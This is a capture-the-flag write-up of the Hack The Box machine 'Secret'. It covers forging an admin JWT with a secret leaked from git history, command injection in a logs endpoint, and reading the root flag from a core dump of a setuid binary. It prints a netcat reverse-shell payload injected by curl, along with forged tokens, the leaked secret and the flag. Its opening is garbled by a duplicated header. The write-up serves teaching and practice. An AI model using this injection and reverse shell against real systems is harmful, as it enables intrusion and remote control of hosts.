# Secret HTB | 0xwerz | 01/15/22 
### The official [box page](https://app.hackthebox.com/machines/Secret) on HTB 
![alt text](https://i.postimg.cc/NjYF1BM9/Secret-Banner.jpg)
### The writeup:
#### System Scan | **IP: 10.10.11.120**
lets add the ip to to the `/etc/hosts` file and name it `secret.htb`
> `echo '10.10.11.120    secret.htb ' >> /etc/hosts`


startup nmap scan | **-sC for the default set of scripts**. | **-sV for Enables version detection**. | **-T4 for sending the traffic fast**.
>`nmap -sC -sV -T4 10.10.11.120`


![alt text](https://i.postimg.cc/vTDsM23v/Screenshot-20220309-125330.png)
## Open Ports
|Ports|Service|Takeaways|
|------|-----|-----|
|22|SSH|OpenSSH 8.2p1|
|80|HTTP|nginx 1.18.0|
|3000|HTTP|Node.js|

Looks like we got a two webservers running with the same **http title** kinda sus

#### Enumeration | ngnix

I will use `gobuster` with [SecLists](https://github.com/danielmiessler/SecLists) wordlists to run the URL bruteforce
>`gobuster dir -u http://secret.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | tee web-enum.txt`

![alt text](# Secret HTB | 0xwerz | 01/15/22 
### The official [box page](https://app.hackthebox.com/machines/Secret) on HTB 
![alt text](https://i.postimg.cc/NjYF1BM9/Secret-Banner.jpg)
### The writeup:
#### System Scan | **IP: 10.10.11.120***
lets add the ip to to the `/etc/hosts` file and name it `secret.htb`
> `echo '10.10.11.120    secret.htb ' >> /etc/hosts`


startup nmap scan | **-sC for the default set of scripts**. | **-sV for Enables version detection**. | **-T4 for sending the traffic fast**.
>`nmap -sC -sV -T4 10.10.11.120`


![alt text](https://i.postimg.cc/vTDsM23v/Screenshot-20220309-125330.png)
### Open Ports
|Ports|Service|Takeaways|
|------|-----|-----|
|22|SSH|OpenSSH 8.2p1|
|80|HTTP|nginx 1.18.0|
|3000|HTTP|Node.js|

Looks like we got a two webservers running with the same **http title** kinda sus

#### Enumeration | ngnix

I will use `gobuster` with [SecLists](https://github.com/danielmiessler/SecLists) wordlists to run the URL bruteforce
>`gobuster dir -u http://secret.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt | tee web-enum.txt`

![alt text](https://i.postimg.cc/2yTwYm01/gobuster.png)

### Directories dumped
|Dirs|
|---|
|/download|
|/assets|
|/api|
|/docs|

### Manual Enumeration
The webpage gives us out it source code like an opensource project, so lets download it and unzip it `unzip files.zip`. The directory listing looks like it a git repo.
in my case its confirmed by [ohmyzsh](https://github.com/ohmyzsh/ohmyzsh) shell.
![alt text](https://i.postimg.cc/4xQMW7kg/oh-my-zsh.png)

so let's check `/routes/auth.js` we can see there is the `/register` endpoint to register a **user** so lets try sending a **POST** requests maybe are allowed 

![alt text](https://i.postimg.cc/Ss6DxHSp/Screenshot-20220309-151827.png)

looks like a valid request, and it excepting some data **name,email,password**.
its also defined at /local-web/**validations.js** file
and we can see that login endpoint generate a **JWT** token.

![alt text](https://i.postimg.cc/85GPvrSr/Screenshot-20220309-152841.png)

and its get verified on `/routes/verifytoken.js` file

there is a `token secret` on the `.env` file. interesting

### Git Dump Enumeration
I will use git [extractor](https://github.com/internetwache/GitTools) tool to extract everything from the git archives
> `~/Downloads/GitTools/GitTools/Extractor/extractor.sh local-web/ dump`

lets dump what we've got.

![alt text](https://i.postimg.cc/YSQttNPm/image.png)
so now we have the secret token

### Registering 

I'll try to request a token 
first lets creating an account i used the following
> `curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"name": "samiretsamira","email": "samir@samir.com","password": "samiretsamira"}'`

![alt text](https://i.postimg.cc/DZF6NFsb/image.png)
now lets login for login we know there we need to send just email and password **validation.js**

![alt text](https://i.postimg.cc/909GXnGj/image.png)

we are in and we've got our token.
lets check `verifytoken.js` to gets how the JWT tokens get validates

![alt text](https://i.postimg.cc/63vkwB16/Screenshot-20220309-161052.png)

pretty obvious we just have to pass it as a `auth-token` header    

lets send it to **/api/priv** endpoint which kinda tells you if you are admin or not

```bash
curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoic2FtaXJldHNhbWlyYSIsImVtYWlsIjoic2FtaXJAc2FtaXIuY29tIiwiaWF0IjoxNjQ2ODM4ODY4fQ.zev_s--8rCeO10TD6M5bcpv5e0LKsMpVLCox67n0xJg' 
{"role":{"role":"you are normal user","desc":"samiretsamira"}}% 
```
ok, we are not admin, but we have the secret so we can made a token for the admin
so its basically checks if **name =='admin'** if **true** its returns is it to us 

I'll decode my token that the site generated and find out how its made.
I will use [JWT](https://github.com/ticarpi/jwt_tool) tool you can u what ever you want 

```bash
python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoic2FtaXJldHNhbWlyYSIsImVtYWlsIjoic2FtaXJAc2FtaXIuY29tIiwiaWF0IjoxNjQ2ODM4ODY4fQ.zev_s--8rCeO10TD6M5bcpv5e0LKsMpVLCox67n0xJg'

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.5                \______|             @ticarpi      

Original JWT: 

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] _id = "6228c31aacbc0d045ce3d039"
[+] name = "samiretsamira"
[+] email = "samir@samir.com"
[+] iat = 1646838868    ==> TIMESTAMP = 2022-03-09 16:14:28 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

```

### Token Swapping
```bash
python3 jwt_tool.py -I -S hs256 -pc 'name' -pv 'theadmin' -p 'gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE' eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoic2FtaXJldHNhbWlyYSIsImVtYWlsIjoic2FtaXJAc2FtaXIuY29tIiwiaWF0IjoxNjQ2ODQxNzkwfQ.y5yhZ_3VE1Hlb5DG9VWExWrRTEAuYLPT58f0bdZklPo

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.5                \______|             @ticarpi      

Original JWT: 

jwttool_164927ec073ab3e068fd9c8654d34859 - Tampered token - HMAC Signing:
[+]  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ
```

Now we got the `theadmin` token let's verify it at **/api/priv** endpoint
```bash
curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ'

{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}% 
```

we are admin now!

lets try look at log directories, as we can notice in **/routes/private.js** its allowed for admin 
```bash
curl 'http://secret.htb/api/logs\?file\=/etc/passwd' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ' {"killed":false,"code":128,"signal":null,"cmd":"git log --oneline /etc/passwd"}{"killed":false,"code":128,"signal":null,"cmd":"git log --oneline whoami"}
```
Looks like it's a comand injection.

### Exploitation
so  let's get a rev shell.
I will just use **cURL** command line so i need to **URL-Encode** for the payload, you can use [burpsuite](https://portswigger.net/burp/communitydownload) or whatever you want.
**(we can just upload a generated ssh public key and get a ssh shell)**
i love doing it with the OGs way o:

launch a netcat (**nc**) listening port
```bash
nc -lvnp 4444 
listening on [any] 4444 ...
```
**payload:**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR IP PORT >/tmp/f
```
**URL-encoded:** encoded with [urlencoder](https://www.urlencoder.org/)
```bash
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.158%204444%20%3E%2Ftmp%2Ff
```
**Final payload form**:
```bash
curl 'http://secret.htb/api/logs?file=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.15.158%204444%20%3E%2Ftmp%2Ff' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI4YzMxYWFjYmMwZDA0NWNlM2QwMzkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InNhbWlyQHNhbWlyLmNvbSIsImlhdCI6MTY0Njg0MTc5MH0.4o15P7IKPOeId7l1f0htmGhMrPsDkAak8Mi_pxahAuQ'
```
yes! we are in with the user flag **home/dasith/flag.txt**
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.158] from (UNKNOWN) [10.10.11.120] 38594
```

first lets spaw a stabilized shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```
get the user flag

```bash
cat /home/dasith/user.txt
```

## root privilege 
after sometime iv found the **/opt** with a **C** program that count looks like kinda same  as **wc** command
```bash
ls -la
total 56
drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
```
The files are owned by **root** interesting..
```bash
./count
Enter source file/directory name:/root
```
its says enter a **file or a directory**, when i type **/root** its listing it.
```bash
-rw-r--r--	.viminfo
-rw-r--r--	everyone_needs_love.txt
drwxr-xr-x	..
-rw-r--r--	.bashrc
drwxr-xr-x	.local
drwxr-xr-x	snap
lrwxrwxrwx	.bash_history
drwx------	.config
drwxr-xr-x	.pm2
-rw-r--r--	.profile
drwxr-xr-x	.vim
drwx------	.
drwx------	.cache
-r--------	root.txt
drwxr-xr-x	.npm
drwx------	.ssh

Total entries       = 16
Regular files       = 5
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]:
```
after that it asks for saving the results to a file, so i thought about **Leveraging Core Dump** idk why lol.

but i need a more stabilazed shell because i need to but the program in a bg prosess nvm, ill spawn a ssh shelll.

just generate a ssh public key in your machine.
```bash
➜  secret ssh-keygen                                                
Generating public/private rsa key pair.
Enter file in which to save the key (/home/user/.ssh/id_rsa): 
/home/werz/.ssh/id_rsa already exists.
Overwrite (y/n)? 
```
```bash
secret cat /home/werz/.ssh/id_rsa.pub             
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNqDVdacTuvz2AVIqgyOVxu2hxQPf9Uy3wqicy08b6txTgEDTl634/V9FY6V1Sc4gv+tuPyTEu09pT1nuNcoHJPC0Qhf2Vw5Q7+JxfZnJb1FhsRAhN3IKCA3Qp+uzcnCLBqjvSUfH/11PNzntJwK7jkHKOdGmp1hx1HV8uuvrKcxTvFwpRO9LSyG+38cQslawnwSaR99hIw9Aql76qJl96pW+IK10YORNmU2IPL1uIAUuDiSX2r4udpywLiGGaMFsnn9xxwnt6wmMu04X0m31oJ6mD8+NKGP3wuxh36wscyma/jE8EDsCpBaKCuVhyq3gASOKaDDFLN1ZRZdRV1bgFEwq/PFB1vgovZ1jG+TXuBvN86taTvFRFw2CHGI51bcvZwJHS+SfHTZzd8ucqCeTmTmB4mF3047hbkN/QW1R6kPpYH2rVpDiGIfEkndiHLT4cWSivnufp8OXUP4LvP8rUjKHBTiF6Kwi++PBg8ZKSoYIxTZ2UUdid0qzDMHANvh0= werz@werznet
```
copy it, to the target machine **/home/dasith/.ssh/authorized_keys**
```bash
dasith@secret:~/.ssh$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNqDVdacTuvz2AVIqgyOVxu2hxQPf9Uy3wqicy08b6txTgEDTl634/V9FY6V1Sc4gv+tuPyTEu09pT1nuNcoHJPC0Qhf2Vw5Q7+JxfZnJb1FhsRAhN3IKCA3Qp+uzcnCLBqjvSUfH/11PNzntJwK7jkHKOdGmp1hx1HV8uuvrKcxTvFwpRO9LSyG+38cQslawnwSaR99hIw9Aql76qJl96pW+IK10YORNmU2IPL1uIAUuDiSX2r4udpywLiGGaMFsnn9xxwnt6wmMu04X0m31oJ6mD8+NKGP3wuxh36wscyma/jE8EDsCpBaKCuVhyq3gASOKaDDFLN1ZRZdRV1bgFEwq/PFB1vgovZ1jG+TXuBvN86taTvFRFw2CHGI51bcvZwJHS+SfHTZzd8ucqCeTmTmB4mF3047hbkN/QW1R6kPpYH2rVpDiGIfEkndiHLT4cWSivnufp8OXUP4LvP8rUjKHBTiF6Kwi++PBg8ZKSoYIxTZ2UUdid0qzDMHANvh0= werz@werznet > authorized_keys
```
just ssh there now 
```bash
ssh dasith@10.10.11.120
```
so what i need to do is pretty easy 
```
./count
Enter source file/directory name:/root/root.txt
```
i aimed for the flag
```bash
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: y
Path: 
```
then go to the other shell and check process and crash the count program
```bash
dasith@secret:/opt$ ps -aux | grep count
root         825  0.0  0.1 235668  7444 ?        Ssl  Mar10   0:01 /usr/lib/accountsservice/accounts-daemon
root       84603  0.0  0.0   2488   516 pts/2    S+   Mar10   0:00 ./count
root       84633  0.0  0.0   2488   588 ?        S    Mar10   0:00 ./count
dasith     84979  0.0  0.0   2488   588 pts/7    S+   00:19   0:00 ./count
dasith     84997  0.0  0.0   2488   584 pts/4    S+   00:22   0:00 ./count
dasith     85440  0.0  0.0   2488   588 pts/10   S+   01:16   0:00 ./count -p
dasith     85446  0.0  0.0   6432   672 pts/11   S+   01:17   0:00 grep --color=auto count
dasith@secret:/opt$ kill -BUS 85440
```
then just kill the process, and check if its down on the other shell 
```bash
dasith@secret:/opt$ ./count -p
Enter source file/directory name: /root/root.txt
Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: y
Path: Bus error (core dumped)
```
core dumped! 
```bash
dasith@secret:/var/crash$ ls
d  _opt_count.0.crash  _opt_count.1000.crash  _opt_countzz.0.crash
```
Here you can see that the error log has been generated, create a new directory of our own, and then copy the file over there
```bash
dasith@secret:/var/crash$ mkdir /tmp/me
```
```bash
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/me
```
```bash
dasith@secret:/tmp/lucifiel$ ls -la
ls -la
total 436
drwxr-xr-x  2 dasith dasith   4096 Dec  6 07:51 .
drwxrwxrwt 13 root   root     4096 Dec  6 07:49 ..
-rw-r--r--  1 dasith dasith      5 Dec  6 07:51 Architecture
-rw-r--r--  1 dasith dasith 380928 Dec  6 07:51 CoreDump
-rw-r--r--  1 dasith dasith     24 Dec  6 07:51 Date
-rw-r--r--  1 dasith dasith     12 Dec  6 07:51 DistroRelease
-rw-r--r--  1 dasith dasith     10 Dec  6 07:51 ExecutablePath
-rw-r--r--  1 dasith dasith     10 Dec  6 07:51 ExecutableTimestamp
-rw-r--r--  1 dasith dasith      5 Dec  6 07:51 ProblemType
-rw-r--r--  1 dasith dasith     10 Dec  6 07:51 ProcCmdline
-rw-r--r--  1 dasith dasith      4 Dec  6 07:51 ProcCwd
-rw-r--r--  1 dasith dasith     53 Dec  6 07:51 ProcEnviron
-rw-r--r--  1 dasith dasith   2144 Dec  6 07:51 ProcMaps
-rw-r--r--  1 dasith dasith   1336 Dec  6 07:51 ProcStatus
-rw-r--r--  1 dasith dasith      1 Dec  6 07:51 Signal
-rw-r--r--  1 dasith dasith     29 Dec  6 07:51 Uname
-rw-r--r--  1 dasith dasith      3 Dec  6 07:51 UserGroups
```
```bash
dasith@secret:/tmp/me$ strings CoreDump 
CORE
CORE
count
./count -p 
IGISCORE
CORE
ELIFCORE
/opt/count
/opt/count
/opt/count
/opt/count
/opt/count
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
CORE
////////////////
Path: 
Could
LINUX
////////////////
Path: 
Could
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
readdir
fopen
closedir
__isoc99_scanf
strncpy
__stack_chk_fail
putchar
fgetc
strlen
prctl
getchar
fputs
fclose
opendir
getuid
strncat
__cxa_finalize
__libc_start_main
snprintf
__xstat
__lxstat
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Unable to open directory.
??????????
Total entries       = %d
Regular files       = %d
Directories         = %d
Symbolic links      = %d
Unable to open file.
Please check if file exists and you have read privilege.
Total characters = %d
Total words      = %d
Total lines      = %d
Enter source file/directory name: 
%99s
Save results a file? [y/N]: 
Path: 
Could not open %s for writing
:*3$"
Path: esults a file? [y/N]: words      = 2
Total lines      = 2
oot/root.txt
6eddd0a82cdbded0add46c264f939a16   ## THE FLAG !!!
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
uTi7J
|F:m
_rtld_global
__get_cpu_features
_dl_find_dso_for_object
_dl_make_stack_executable
_dl_exception_create
__libc_stack_end
_dl_catch_exception
malloc
_dl_deallocate_tls
_dl_signal_exception
__tunable_get_val
__libc_enable_secure
__tls_get_addr
_dl_get_tls_static_info
calloc
_dl_exception_free
_dl_debug_state
_dl_argv
_dl_allocate_tls_init
_rtld_global_ro
realloc
_dl_rtld_di_serinfo
_dl_mcount
_dl_allocate_tls
_dl_signal_error
_dl_exception_create_format
_r_debug
_dl_catch_error
ld-linux-x86-64.so.2
GLIBC_2.2.5
GLIBC_2.3
GLIBC_2.4
GLIBC_PRIVATE
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
%%%%%%%%%%%%%%%%
////////////////
ory name: 
%99s
/root/root.txt
Total characters = 33
Total words      = 2
Total lines      = 2
x86_64
./count
SHELL=/bin/bash
PWD=/opt
LOGNAME=dasith
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/dasith
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.10.15.158 51728 10.10.11.120 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=dasith
SHLVL=1
XDG_SESSION_ID=20
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=10.10.15.158 51728 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
SSH_TTY=/dev/pts/10
_=./count
OLDPWD=/var/crash
./count
bemX
__vdso_gettimeofday
__vdso_time
__vdso_clock_gettime
__vdso_clock_getres
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
AUATS
A\A]]
[A\M
A]]I
[A\]
[A\]
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
```
and we've got the flag!
